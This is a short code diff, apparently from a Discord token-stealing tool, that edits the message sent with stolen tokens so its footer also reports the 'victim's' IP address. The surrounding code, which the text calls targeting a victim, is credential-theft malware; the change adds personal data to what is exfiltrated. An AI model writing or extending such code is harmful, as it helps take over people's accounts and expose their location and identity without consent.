@@ -143,7 +143,7 @@ data = {
                 for x in tokens
             ],
             "footer": {
-                "text": "If 'Unknown' is returned it likely means the victim has not logged into discord."
+                "text": f"Victim's IP: {get_ip()}\nIf 'Unknown' is returned it likely means the victim has not logged into discord."
             }
         }
     ]
